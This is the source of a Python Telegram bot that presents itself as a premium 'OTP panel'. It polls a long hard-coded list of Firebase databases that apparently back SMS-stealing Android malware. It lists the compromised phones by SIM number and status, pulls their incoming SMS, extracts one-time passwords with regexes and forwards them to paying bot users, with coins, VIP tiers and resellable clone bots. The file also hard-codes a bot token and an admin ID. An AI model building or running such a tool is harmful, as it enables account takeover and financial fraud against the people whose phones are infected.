#!/usr/bin/env python3
"""
════════════════════════════════════════════════════════════
        OTP PANEL BOT — SUPREME PREMIUM EDITION v4.3
   Clean Minimal UI | Zero Glitches | Auto Live Notifications
════════════════════════════════════════════════════════════
"""

import os
import re
import time
import json
import asyncio
import logging
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime
from typing import Optional
import aiohttp
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, KeyboardButton, ChatMember, BotCommand,
)
from telegram.error import BadRequest
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes,
)

logging.basicConfig(
    format="%(asctime)s — %(name)s — %(levelname)s — %(message)s",
    level=logging.WARNING,
)

# ════════════════════════════════════════════════════════════
#  RENDER KEEP-ALIVE SERVER (DUMMY SERVER)
# ════════════════════════════════════════════════════════════

class Dummy(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"Bot is Running 24/7 on Render!")

def keep_alive():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), Dummy)
    threading.Thread(target=server.serve_forever, daemon=True).start()

# ════════════════════════════════════════════════════════════
#  CONFIG
# ════════════════════════════════════════════════════════════

DATABASES = {
    "Heaven": "https://hood-4ba1e-default-rtdb.firebaseio.com",
    "Lucifer": "https://lucifer-spreader-default-rtdb.firebaseio.com",
    "Totla": "https://totla-axis-default-rtdb.firebaseio.com",
    "RGG": "https://rgggggggggg-e2547-default-rtdb.firebaseio.com",
    "Bulbul": "https://bulbul8084-9a5df-default-rtdb.firebaseio.com",
    "Systumm": "https://systumm-c8526-default-rtdb.firebaseio.com",
    "Ravan": "https://ravan-98ef1-default-rtdb.firebaseio.com",
    "Yellow": "https://yellow-pannel-dadc7-default-rtdb.firebaseio.com",
    "PMKishan": "https://pmkishan8-6b70f-default-rtdb.firebaseio.com",
    "NoAdmin": "https://no-admin-e0a30-default-rtdb.firebaseio.com",
    "SexyPayload": "https://sexypayload-default-rtdb.firebaseio.com",
    "Love": "https://love-13ffc-default-rtdb.firebaseio.com",
    "Deepak": "https://deepak-c22e3-default-rtdb.firebaseio.com",
    "Takul": "https://takul-cf410-default-rtdb.firebaseio.com",
    "RTO": "https://rto-02-april06-default-rtdb.firebaseio.com",
    "PKSK": "https://projectpksk05102025-default-rtdb.firebaseio.com",
    "Rajkumar": "https://rajkumar-b6cbe-default-rtdb.firebaseio.com",
    "Rtoo": "https://rtoo-6c8e6-default-rtdb.firebaseio.com",
    "Upandar": "https://upandar-bb51e-default-rtdb.firebaseio.com",
    "Rolex": "https://rolex-carder-default-rtdb.firebaseio.com",
    "Rettiugh": "https://rettiugh-default-rtdb.firebaseio.com",
    "BusinessApps": "https://business-apps-ba1-8d27c-default-rtdb.firebaseio.com",
    "Jeet": "https://jeet-op-default-rtdb.firebaseio.com",
    "Vvvvv": "https://vvvvv-b5eae-default-rtdb.firebaseio.com",
    "Jaanu": "https://jaanubaby-f7b34-default-rtdb.firebaseio.com",
    "JJGambler": "https://jj-gambler-default-rtdb.firebaseio.com",
    "Suman": "https://suman-penal-default-rtdb.firebaseio.com",
    "Tuuui": "https://tuuui-60b15-default-rtdb.firebaseio.com",
    "AdminSonu": "https://admin-sonu-8a567-default-rtdb.firebaseio.com",
    "Rohet": "https://rohet10-8919f-default-rtdb.firebaseio.com",
    "Zeni": "https://zeni-ae60b-default-rtdb.firebaseio.com",
    "Maxxx": "https://maxxx-randi-default-rtdb.firebaseio.com",
    "Gulabi": "https://gulabi-fuddi-default-rtdb.firebaseio.com",
    "Comkingdir": "https://comkingdir-default-rtdb.firebaseio.com",
    "Tracegod": "https://tracegod-168d5-default-rtdb.firebaseio.com",
    "UCOp": "https://uc-op-ca3d2-default-rtdb.firebaseio.com",
    "SMSForward": "https://smsforward-b2198.firebaseio.com",
    "Hdrbf": "https://hdrbf-485ec-default-rtdb.firebaseio.com",
    "Bunty": "https://bunty-51bcc-default-rtdb.firebaseio.com",
    "VishalAravat": "https://vishal-x-aravat-default-rtdb.firebaseio.com",
    "AdminCliwny": "https://admin-cliwny-default-rtdb.firebaseio.com",
    "Danish": "https://danish-77fe3-default-rtdb.firebaseio.com",
    "MasterAdmin": "https://master-admin-6c650-default-rtdb.firebaseio.com",
    "PanelOp": "https://panel-op-feb4d-default-rtdb.firebaseio.com",
    "PM23": "https://pm23-98f32-default-rtdb.firebaseio.com",
    "Iiiii": "https://iiiii-ade0e-default-rtdb.firebaseio.com",
    "Pint": "https://pint-f465b-default-rtdb.firebaseio.com",
    "AdminPanel": "https://admin-panel-bfcdc-default-rtdb.firebaseio.com",
    "CallMeBitch": "https://callmebitchfumckyou-default-rtdb.firebaseio.com",
    "Demonrat": "https://demonrat-aa782-default-rtdb.firebaseio.com",
    "Access20": "https://access20-3fc38-default-rtdb.firebaseio.com",
    "Article": "https://article-efd36-default-rtdb.firebaseio.com",
    "Rajababu": "https://rajababukvirat-default-rtdb.firebaseio.com",
    "AxisSuraj": "https://axis-suraj-tele-apcd001-default-rtdb.firebaseio.com",
    "Sandycall": "https://sandycall-18b15-default-rtdb.firebaseio.com",
    "Suihd": "https://suihd-default-rtdb.firebaseio.com",
    "Harrwp": "https://harrwp-6be36-default-rtdb.firebaseio.com",
    "TestFirebase": "https://test-firebase.firebaseio.com",
    "Adutapp": "https://adutappbylucy-default-rtdb.firebaseio.com",
    "Download": "https://download-b7393-default-rtdb.firebaseio.com",
    "Bobnewloda": "https://bobnewloda-default-rtdb.firebaseio.com",
    "Artikumari": "https://artikumari-abc97-default-rtdb.firebaseio.com",
    "Seuihd": "https://seuihd-default-rtdb.firebaseio.com",
    "Gigapaid": "https://gigapaid-39e9c-default-rtdb.firebaseio.com",
    "Angeladmin": "https://angeladmin-9dedc-default-rtdb.firebaseio.com",
    "FirNew": "https://fir-new-fe8b8-default-rtdb.firebaseio.com",
    "Priysnshuu": "https://priysnshuu-default-rtdb.firebaseio.com",
    "Haab": "https://haab-b3370-default-rtdb.firebaseio.com",
    "Ueuwuw": "https://ueuwuw-default-rtdb.firebaseio.com",
    "Test": "https://test-firebaseio.com",
    "Jkhsadfhjk": "https://jkhsadfhjk-default-rtdb.firebaseio.com",
    "Sonic": "https://sonic-d5c1a-default-rtdb.firebaseio.com",
    "Jonisins": "https://jonisins-52271-default-rtdb.firebaseio.com",
    "Dusman": "https://dusman-abf8b-default-rtdb.firebaseio.com",
    "Riyy": "https://riyy-e012e-default-rtdb.firebaseio.com",
    "Xkpz": "https://xkpz-f937a-default-rtdb.firebaseio.com",
    "Thanu": "https://thanu-4174d-default-rtdb.firebaseio.com",
    "Vdgsh": "https://vdgsh-623ed-default-rtdb.firebaseio.com",
    "Vibe": "https://vibe-d238e-default-rtdb.firebaseio.com",
    "Jamini": "https://jamini-c946b-default-rtdb.firebaseio.com",
    "Chutkabaal": "https://chutkabaal-d7051-default-rtdb.firebaseio.com",
    "Surya": "https://surya-917b9-default-rtdb.firebaseio.com",
    "Doodh": "https://doodh-f4f98-default-rtdb.firebaseio.com",
    "Easrerrr": "https://easrerrr-default-rtdb.firebaseio.com",
    "Maxbhai": "https://maxbhai-b8d3a-default-rtdb.firebaseio.com",
    "Upandar2": "https://upandar-bb51e-default-rtdb.firebaseio.com",
    "Uuuuu": "https://uuuuu-ee02e-default-rtdb.firebaseio.com",
    "Vamprandi": "https://vamprandi-default-rtdb.firebaseio.com",
    "VishalMC": "https://vishal-mc-default-rtdb.firebaseio.com",
    "ProjectF2FD6": "https://project-f2fd6-default-rtdb.firebaseio.com",
    "Rajakk": "https://rajakk-80ecd-default-rtdb.firebaseio.com",
    "ILove": "https://i-love-9e34a-default-rtdb.firebaseio.com",
    "Customer1B7CA": "https://customer-1b7ca-default-rtdb.firebaseio.com",
    "Nunu2XX": "https://nunu2xx-a8c5b-default-rtdb.firebaseio.com",
}

POLL_INTERVAL = 5
SMS_LIMIT     = 15
TOKEN         = "8437134912:AAFPxS63ZgoNF3XH-69EDn0nhBqys-1iAtE"
BOT_USERNAME  = "onlinenonlyscript_bot"
DB_FILE       = "bot_database.json"

ADMIN_IDS: set[int] = {7178096331}

REQUIRED_CHANNELS = [
    {"username": "earnflowspidy", "url": "https://t.me/earnflowspidy", "name": "Raji Expilot"},
]

# ════════════════════════════════════════════════════════════
#  GLOBAL STATE
# ════════════════════════════════════════════════════════════

seen_ids: set[str] = set()
first_run: bool = True
_main_app: Optional[Application] = None
_http_session: Optional[aiohttp.ClientSession] = None

all_users: dict[int, dict] = {}
pending_action: dict[int, dict] = {}
user_cooldowns: dict[int, float] = {}
user_focus: dict[str, dict[int, str]] = {TOKEN: {}}
chats_registry: dict[str, set[int]] = {TOKEN: set()}

CLONES: dict[str, dict] = {}
GLOBAL_DEVICE_CACHE: dict[str, list] = {}

# ════════════════════════════════════════════════════════════
#  PERSISTENCE
# ════════════════════════════════════════════════════════════

def _sync_save_data():
    try:
        clones_to_save = {}
        for t, d in CLONES.items():
            clones_to_save[t] = {
                "creator": d.get("creator"), "expiry": d.get("expiry"),
                "custom_db": d.get("custom_db"), "users": d.get("users", {}),
                "username": d.get("username", ""),
            }
        with open(DB_FILE, "w") as f:
            json.dump({"all_users": all_users, "CLONES": clones_to_save}, f, indent=4)
    except Exception as e:
        tlog(f"Save Data Error: {e}")

async def save_data_async():
    await asyncio.to_thread(_sync_save_data)

def load_data():
    global all_users, CLONES
    if not os.path.exists(DB_FILE):
        return
    try:
        with open(DB_FILE, "r") as f:
            data = json.load(f)
        for k, v in data.get("all_users", {}).items():
            all_users[int(k)] = v
        for t, d in data.get("CLONES", {}).items():
            restored_users = {}
            for uk, uv in d.get("users", {}).items():
                restored_users[int(uk)] = uv
            d["users"] = restored_users
            CLONES[t] = d
    except Exception as e:
        tlog(f"Load Data Error: {e}")

async def auto_save_loop():
    while True:
        await asyncio.sleep(60)
        await save_data_async()

# ════════════════════════════════════════════════════════════
#  ANTI-SPAM & VIP
# ════════════════════════════════════════════════════════════

def is_spamming(user_id: int) -> bool:
    if user_id in ADMIN_IDS:
        return False
    now = time.time()
    if now - user_cooldowns.get(user_id, 0) < 1.0:
        return True
    user_cooldowns[user_id] = now
    return False

def is_vip(bot_token: str, user_id: int) -> bool:
    if bot_token == TOKEN and user_id in ADMIN_IDS:
        return True
    if bot_token != TOKEN and user_id == CLONES.get(bot_token, {}).get("creator"):
        return True
    users_db = all_users if bot_token == TOKEN else CLONES.get(bot_token, {}).get("users", {})
    return time.time() < users_db.get(user_id, {}).get("vip_until", 0.0)

def get_vip_time_left(bot_token: str, user_id: int) -> str:
    users_db = all_users if bot_token == TOKEN else CLONES.get(bot_token, {}).get("users", {})
    left = users_db.get(user_id, {}).get("vip_until", 0.0) - time.time()
    if left <= 0:
        return "Not VIP"
    h, m = int(left // 3600), int((left % 3600) // 60)
    return f"{h}h {m}m"

def tlog(msg: str) -> None:
    print(f"[{datetime.now().strftime('%I:%M:%S %p')}]  {msg}", flush=True)

async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    tlog(f"Telegram API Error: {context.error}")

# ════════════════════════════════════════════════════════════
#  HTTP SESSION
# ════════════════════════════════════════════════════════════

async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=1000, keepalive_timeout=30)
        _http_session = aiohttp.ClientSession(connector=connector)
    return _http_session

async def fb_get(path: str, base: str) -> Optional[dict]:
    try:
        session = await get_http_session()
        url = f"{base}/{path}.json" if path else f"{base}/.json"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
            if r.status != 200:
                return None
            data = await r.json(content_type=None)
            return data if isinstance(data, dict) else None
    except Exception:
        return None

async def fb_keys(path: str, base: str) -> list[str]:
    try:
        session = await get_http_session()
        url = f"{base}/{path}.json?shallow=true" if path else f"{base}/.json?shallow=true"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
            if r.status != 200:
                return []
            data = await r.json(content_type=None)
            return list(data.keys()) if isinstance(data, dict) else []
    except Exception:
        return []

# ════════════════════════════════════════════════════════════
#  CHANNEL CHECK
# ════════════════════════════════════════════════════════════

async def check_membership(bot_token, bot, user_id: int) -> list[str]:
    if bot_token != TOKEN:
        return []
    not_joined = []
    for ch in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(chat_id=f"@{ch['username']}", user_id=user_id)
            status = str(member.status).lower()
            if status in ("left", "kicked", "banned"):
                not_joined.append(ch["username"])
        except Exception as e:
            tlog(f"⚠️ Membership check failed for @{ch['username']}: {e}")
            continue
    return not_joined

async def send_join_prompt(update: Update, is_main_bot: bool) -> None:
    buttons = [[InlineKeyboardButton(f"📢 Join {ch['name']}", url=ch["url"])] for ch in REQUIRED_CHANNELS]
    buttons.append([InlineKeyboardButton("✅ I Have Joined — Check Now", callback_data="check_join")])
    text = "🔒 *Verification Required*\n\nBot use karne ke liye neeche diye gaye channels join karna hoga:\n\n"
    for ch in REQUIRED_CHANNELS:
        text += f"• {ch['name']}: {ch['url']}\n"
    text += "\nChannel join karne ke baad 'Check Now' button dabayein."
    await update.effective_message.reply_text(
        text, reply_markup=InlineKeyboardMarkup(buttons),
        disable_web_page_preview=True, parse_mode="Markdown")

# ════════════════════════════════════════════════════════════
#  UTILITIES
# ════════════════════════════════════════════════════════════

def fmt_num(n: str) -> str:
    c = re.sub(r"\D", "", n)
    if c.startswith("91") and len(c) == 12: return f"+{c}"
    if len(c) == 10: return f"+91{c}"
    if len(c) > 4: return f"+{c}"
    return c

def bat_emoji(pct: int) -> str:
    return "🔋" if pct >= 20 else "🪫"

OTP_PATTERNS = [
    re.compile(r"OTP[^\d]*(\d{4,8})", re.IGNORECASE),
    re.compile(r"code[^\d]*(\d{4,8})", re.IGNORECASE),
    re.compile(r"password[^\d]*(\d{4,8})", re.IGNORECASE),
    re.compile(r"\b(\d{6})\b"),
    re.compile(r"\b(\d{4})\b"),
]

def extract_otp(text: str) -> Optional[str]:
    for pat in OTP_PATTERNS:
        m = pat.search(text)
        if m: return m.group(1)
    return None

def parse_battery(val) -> int:
    if isinstance(val, (int, float)): return int(val)
    if isinstance(val, str):
        d = re.sub(r"\D", "", val)
        return int(d) if d else 0
    return 0

def parse_status_str(val) -> str:
    if not val: return "offline"
    return "online" if str(val).lower() == "online" else "offline"

def parse_status_bool(val) -> str:
    return "online" if val is True else "offline"

def sms_date(sms: dict) -> str:
    date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
    if date_str: return date_str
    if sms.get("timestamp"):
        try:
            ts = float(sms["timestamp"])
            if ts > 1e11: ts /= 1000
            return datetime.fromtimestamp(ts).strftime("%d %b %Y %I:%M %p")
        except: pass
    return "N/A"

def seen_key(device_id: str, k: str) -> str:
    return f"{device_id}/{k}"

def user_display(info: dict) -> str:
    name = info.get("name", "Unknown")
    uname = info.get("username", "")
    return f"{name} (@{uname})" if uname else name

# ════════════════════════════════════════════════════════════
#  DEVICE CLASS
# ════════════════════════════════════════════════════════════

PAGE_SIZE = 20

class Device:
    __slots__ = ("id", "name", "status", "battery", "timestamp",
                 "numbers", "device_info", "sms_path", "base_url", "db_tag")

    def __init__(self, id, name, status, battery, timestamp, numbers, device_info, sms_path, base_url, db_tag):
        self.id = id
        self.name = name
        self.status = status
        self.battery = battery
        self.timestamp = timestamp
        self.numbers = numbers
        self.device_info = device_info
        self.sms_path = sms_path
        self.base_url = base_url
        self.db_tag = db_tag

# ════════════════════════════════════════════════════════════
#  FIREBASE FETCHERS
# ════════════════════════════════════════════════════════════

async def fetch_db_data(tag: str, url: str) -> list[Device]:
    devices_list = []
    added_set = set()
    try:
        root_keys, sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
            fb_keys("", url),
            fb_get("All_Users/simDetails", url),
            fb_get("All_Users/Data/DeviceInfo", url),
            fb_get("user_data", url),
            fb_get("clients", url),
        )

        if sim_all and isinstance(sim_all, dict):
            info_all = device_info_all or {}
            for dev_id, sim in sim_all.items():
                if dev_id in added_set: continue
                added_set.add(dev_id)
                info = info_all.get(dev_id) or {}
                nums = []
                for field in ("sim1Number", "sim2Number"):
                    n = (sim or {}).get(field, "") or ""
                    if n and len(re.sub(r"\D", "", n)) > 4:
                        nums.append(fmt_num(n))
                model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
                devices_list.append(Device(
                    id=dev_id, name=model, status=parse_status_str(info.get("Status")),
                    battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or 0),
                    numbers=nums,
                    device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nAndroid: {info.get('AndroidVersion','')}\nDevice ID: {dev_id}",
                    sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))

        if user_data_all and isinstance(user_data_all, dict):
            for dev_id, data in user_data_all.items():
                if dev_id in added_set: continue
                if not isinstance(data, dict): continue
                added_set.add(dev_id)
                nums = []
                for field in ("numberSim1", "numberSim2", "mobNo"):
                    n = data.get(field, "")
                    if n and len(re.sub(r"\D", "", str(n))) > 4:
                        nums.append(fmt_num(str(n)))
                devices_list.append(Device(
                    id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}",
                    status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")),
                    timestamp=int(data.get("timestamp") or 0), numbers=nums,
                    device_info=data.get("Device_info") or f"Device ID: {dev_id}",
                    sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag))

        if clients_all and isinstance(clients_all, dict):
            for dev_id, client in clients_all.items():
                if dev_id in added_set: continue
                if not isinstance(client, dict): continue
                nums = []
                mob = client.get("mobNo") or ""
                if mob and len(re.sub(r"\D", "", mob)) > 5:
                    nums.append(fmt_num(mob))
                elif client.get("sims") and isinstance(client["sims"], list):
                    if len(client["sims"]) > 0:
                        ph = (client["sims"][0] or {}).get("phoneNumber") or ""
                        if ph and len(re.sub(r"\D", "", ph)) > 5:
                            nums.append(fmt_num(ph))
                if not nums and not client.get("modelName"): continue
                added_set.add(dev_id)
                model = client.get("modelName") or f"Device-{dev_id[:6]}"
                devices_list.append(Device(
                    id=dev_id, name=model, status=parse_status_bool(client.get("status")),
                    battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums,
                    device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}\nAndroid: {client.get('androidV','')}\nDevice ID: {dev_id}",
                    sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))

        if root_keys:
            type4_keys = [k for k in root_keys if len(k) == 16 and re.match(r"^[0-9a-fA-F]+$", k)]
            if type4_keys:
                async def fetch_t4(k):
                    info, sim, hb = await asyncio.gather(
                        fb_get(f"{k}/deviceInfo", url), fb_get(f"{k}/simInfo", url), fb_get(f"{k}/heartbeat", url))
                    return k, info, sim, hb
                results = await asyncio.gather(*(fetch_t4(k) for k in type4_keys))
                for k, info, sim, hb in results:
                    if not isinstance(info, dict): continue
                    if k in added_set: continue
                    added_set.add(k)
                    nums = []
                    if isinstance(sim, dict):
                        for _, sim_v in sim.items():
                            if isinstance(sim_v, dict):
                                n = sim_v.get("number", "")
                                if n and len(re.sub(r"\D", "", n)) > 4:
                                    nums.append(fmt_num(n))
                    model = info.get("model") or info.get("brand") or f"Device-{k[:6]}"
                    ts = int(hb) if isinstance(hb, (int, float)) else 0
                    is_online = (time.time() * 1000 - ts) < 300000 if ts else False
                    status = "online" if is_online else "offline"
                    devices_list.append(Device(
                        id=k, name=model, status=status, battery=0, timestamp=ts, numbers=nums,
                        device_info=f"Model: {model}\nBrand: {info.get('brand','')}\nAndroid: {info.get('version','')}\nDevice ID: {k}",
                        sms_path=f"{k}/receivedSms", base_url=url, db_tag=tag))
    except Exception:
        pass
    return devices_list

async def get_all_devices(bot_token: str) -> list[Device]:
    dbs_to_check = list(DATABASES.keys())
    if bot_token != TOKEN and bot_token in CLONES:
        custom_db = CLONES[bot_token].get("custom_db")
        if custom_db:
            dbs_to_check.append(f"C_{bot_token[:6]}")
    devices = []
    for tag in dbs_to_check:
        devices.extend(GLOBAL_DEVICE_CACHE.get(tag, []))
    unique_devices = {}
    for d in devices:
        if d.id not in unique_devices:
            unique_devices[d.id] = d
    dev_list = list(unique_devices.values())
    dev_list.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
    return dev_list

async def get_device_sms(device: Device, limit: int = SMS_LIMIT) -> list[dict]:
    data = await fb_get(device.sms_path, device.base_url)
    if not data: return []
    entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
    entries.sort(key=lambda s: int(s.get("timestamp") or 0), reverse=True)
    return entries[:limit]

# ════════════════════════════════════════════════════════════
#  COMMAND MENU REGISTRATION
# ════════════════════════════════════════════════════════════

async def register_commands(app: Application):
    commands = [
        BotCommand("start",    "🚀 Start the bot"),
        BotCommand("points",   "💰 Check your coins"),
        BotCommand("referral", "💸 Get referral link"),
        BotCommand("cancel",   "❌ Cancel ongoing operation"),
        BotCommand("help",     "🛡 Admin commands (admin only)"),
        BotCommand("stats",    "📊 Bot statistics (admin only)"),
    ]
    try:
        await app.bot.set_my_commands(commands)
        tlog(f"✅ Commands registered: {len(commands)}")
    except Exception as e:
        tlog(f"⚠️ Failed to set commands: {e}")

# ════════════════════════════════════════════════════════════
#  CLONE BOT ENGINE
# ════════════════════════════════════════════════════════════

async def start_clone_bot(clone_token: str):
    app = (
        Application.builder()
        .token(clone_token)
        .connection_pool_size(1000)
        .pool_timeout(60.0)
        .connect_timeout(30.0)
        .read_timeout(30.0)
        .write_timeout(30.0)
        .build()
    )
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("points", cmd_points))
    app.add_handler(CommandHandler("referral", cmd_referral))
    app.add_handler(CommandHandler("cancel", cmd_cancel))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.COMMAND, on_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_error_handler(global_error_handler)
    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)
    await register_commands(app)
    return app

# ════════════════════════════════════════════════════════════
#  UI BUILDERS (CLEANED)
# ════════════════════════════════════════════════════════════

def get_clean_main_menu(is_admin: bool) -> ReplyKeyboardMarkup:
    """Only shows minimal, clean buttons to the user"""
    keys = [
        [KeyboardButton("📱 Devices List"), KeyboardButton("🔍 Search Number")],
    ]
    if is_admin:
        keys.append([KeyboardButton("🛡 Admin Panel")])
    return ReplyKeyboardMarkup(keys, resize_keyboard=True)

def device_label(d: Device) -> str:
    if d.numbers: return " & ".join(d.numbers)
    return f"{d.name} ({d.id[:8]})"

def device_list_header(devices: list[Device], page: int = 0) -> str:
    online = sum(1 for d in devices if d.status == "online")
    offline = len(devices) - online
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    return (
        f"✨ <b>OTP PANEL PRO</b> ✨\n━━━━━━━━━━━━━━━━━━━\n"
        f"🟢 Online: {online}   🔴 Offline: {offline}\n"
        f"📱 Total: {len(devices)} Devices\n📄 Page {page + 1} of {total_pages}\n"
        f"━━━━━━━━━━━━━━━━━━━\nSelect a number below to connect and receive its OTPs:"
    )

def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboardMarkup:
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    page = max(0, min(page, total_pages - 1))
    start = page * PAGE_SIZE
    page_devs = devices[start: start + PAGE_SIZE]
    rows = []

    def _btn(d: Device):
        tag = f"[{d.db_tag}] "
        icon = "🟢" if d.status == "online" else "🔴"
        if d.numbers:
            lbl = f"{icon} 📱 {tag}{' & '.join(d.numbers)}"
        else:
            lbl = f"{icon} ⚙️ {tag}{d.name} ({d.id[:6]})"
        return InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")

    for d in page_devs:
        rows.append([_btn(d)])

    nav = []
    if page > 0: nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f"pg:{page - 1}"))
    nav.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ▶️", callback_data=f"pg:{page + 1}"))
    rows.append(nav)
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="home"), InlineKeyboardButton("🔍 Online Only", callback_data="online")])
    rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def online_only_keyboard(devices: list[Device]) -> InlineKeyboardMarkup:
    online = [d for d in devices if d.status == "online"]
    rows = []
    if online:
        for d in online:
            tag = f"[{d.db_tag}] "
            if d.numbers:
                lbl = f"🟢 📱 {tag}{' & '.join(d.numbers)}"
            else:
                lbl = f"🟢 ⚙️ {tag}{d.name} ({d.id[:6]})"
            rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
    else:
        rows.append([InlineKeyboardButton("😴 No devices online", callback_data="noop")])
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="online"), InlineKeyboardButton("📋 All Numbers", callback_data="pg:0")])
    rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def auto_forward_msg(sms: dict, num_label: str) -> str:
    """Sends OTP notification without the copy button (Highlight only)"""
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp = extract_otp(body)
    date = sms_date(sms)
    sim = sms.get("sim_number") or ""
    sender = sms.get("sender") or "Unknown"
    
    if otp:
        sim_line = f"│ 📡 SIM : {sim}\n" if sim else ""
        return (f"✨ <b>NEW OTP RECEIVED</b> ✨\n━━━━━━━━━━━━━━━━━━\n"
                f"│ 🔑 OTP : <code>{otp}</code>\n│ 📱 Number : {num_label}\n"
                f"│ 👤 From : {sender}\n│ 📅 Date : {date}\n{sim_line}"
                f"━━━━━━━━━━━━━━━━━━\n💬 {body}")
    return (f"📩 <b>NEW SMS RECEIVED</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"📱 Number : {num_label}\n👤 From : {sender}\n📅 Date : {date}\n"
            f"━━━━━━━━━━━━━━━━━━\n💬 {body}")

def get_vip_denied_keyboard(chat_id: int, req_coins: int) -> InlineKeyboardMarkup:
    """Shows VIP & Premium features inline if they don't have access"""
    ref_link = f"https://t.me/{BOT_USERNAME}?start={chat_id}"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👑 Buy VIP (20 🪙)", callback_data="buy_vip"),
         InlineKeyboardButton("💸 Refer & Earn", url=f"https://t.me/share/url?url={ref_link}&text=Try this premium OTP Panel Bot!")],
        [InlineKeyboardButton(f"🤖 Create Clone Bot ({req_coins} 🪙)", callback_data="create_bot")],
        [InlineKeyboardButton("❌ Close", callback_data="close_msg")]
    ])

def admin_panel_text(bot_token: str) -> str:
    users_db = all_users if bot_token == TOKEN else CLONES[bot_token]["users"]
    total = len(users_db)
    verified = sum(1 for u in users_db.values() if u.get("verified"))
    unverified = total - verified
    total_otps = sum(u.get("otp_count", 0) for u in users_db.values())
    active_chats = len(chats_registry.get(bot_token, set()))
    text = (f"🛡 <b>ADMIN PANEL</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"👥 Total Users    : {total}\n✅ Verified Users : {verified}\n"
            f"⏳ Unverified     : {unverified}\n📡 Active Chats   : {active_chats}\n"
            f"🏆 Total OTP Views: {total_otps}\n")
    if bot_token == TOKEN:
        text += f"🤖 Cloned Bots    : {len(CLONES)}\n"
    text += f"━━━━━━━━━━━━━━━━━━\n🕐 Updated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
    return text

def admin_keyboard(bot_token: str) -> InlineKeyboardMarkup:
    keys = [
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
         InlineKeyboardButton("👥 User List", callback_data="admin_users")],
        [InlineKeyboardButton("🎁 Gift Coins to All", callback_data="admin_gift_coins")],
        [InlineKeyboardButton("➕ Add Firebase URL", callback_data="admin_add_firebase")]
    ]
    if bot_token != TOKEN:
        keys.append([InlineKeyboardButton("🔗 Add Custom Firebase URL", callback_data="add_custom_db")])
    keys.append([InlineKeyboardButton("🔄 Refresh", callback_data="admin_refresh"),
                 InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(keys)

async def safe_edit(query, text, reply_markup=None, parse_mode="HTML", disable_web_page_preview=False):
    try:
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode,
                                       disable_web_page_preview=disable_web_page_preview)
    except BadRequest as e:
        if "not modified" not in str(e).lower():
            tlog(f"Edit Message Error: {e}")
            try:
                await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=None)
            except:
                pass

# ════════════════════════════════════════════════════════════
#  TELEGRAM HANDLERS
# ════════════════════════════════════════════════════════════

async def send_bonus_if_applicable(ctx, chat_id: int, users_db: dict, is_main_bot: bool):
    if is_main_bot and not users_db[chat_id].get("bonus_10_received"):
        users_db[chat_id]["bonus_10_received"] = True
        users_db[chat_id]["coins"] = users_db[chat_id].get("coins", 0) + 10
        try:
            await ctx.bot.send_message(
                chat_id,
                "🎉 <b>GIFT FROM ADMIN</b> 🎉\n\nAdmin ne aapko <b>10 Coins free</b> diye hain! 🎁\n\n"
                "Ab sirf <b>1 refer</b> (10 coins) aur karo aur khudka OTP bot banao 24 hours ke liye!\n\n"
                "To get your link, attempt to open the Devices List.", parse_mode="HTML")
        except: pass

